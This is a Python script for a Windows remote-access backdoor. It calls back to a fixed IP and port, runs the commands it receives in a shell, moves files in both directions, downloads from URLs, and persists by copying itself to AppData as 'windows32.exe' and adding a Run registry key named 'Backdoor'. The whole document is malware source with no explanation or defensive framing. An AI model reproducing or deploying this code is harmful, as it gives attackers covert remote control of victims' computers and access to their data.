#!/usr/bin/python3

import socket,subprocess,sys,os
import base64,time,requests
import json,shutil

def reliable_recv():
    data = ""
    while True:
        try:
            data += sock.recv(1024)
            return json.loads(data)
        except ValueError:
            continue


def reliable_send(data):
    json_data = json.dumps(data)
    sock.send(json_data)

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name,"wb") as f:
        f.write(get_response.content)

def connection():
    while True:
        time.sleep(20)
        try:
            sock.connect(("192.168.0.107",54321))
            shell()
        except Exception as err:
            connection()

def shell():
    while True:
        command = sock.recv(1024).decode("utf-8")
        print("cmd -> "+command)
        if command == 'q':
            sys.exit(0)
            break
        elif command[:2] == "cd" and len(command) > 1:
            try:
                os.chdir(command[3:])
            except:
                continue
        elif command[:5] == "mkdir" and len(command) > 1:
            try:
                os.mkdir(command[6:])
            except:
                continue
        elif command[:8] == "download":
            with open(command[9:],"rb") as f:
                reliable_send(base64.b64encode(f.read()))
        elif command[:6] == "upload":
            with open(command[7:],"wb") as f:
                #try:
                file_data = reliable_recv()
                f.write(base64.b64decode(file_data))
        elif command[:3] == "get":
            try:
                download(command[4:])
                reliable_send("[+] Download file from specific URL!")
            except:
                reliable_send("[+] Download file from specific URL!")

        else:
            message = subprocess.check_output(command,shell=True)
            sock.send(message)


if __name__ == "__main__":

    location = os.environ["appdata"] + "\\windows32.exe"
    if not os.path.exists(location):
        shutil.copyfile(sys.executable,location)
        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d"'+location+'"',shell=True)


    global sock
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    connection()
    sock.close()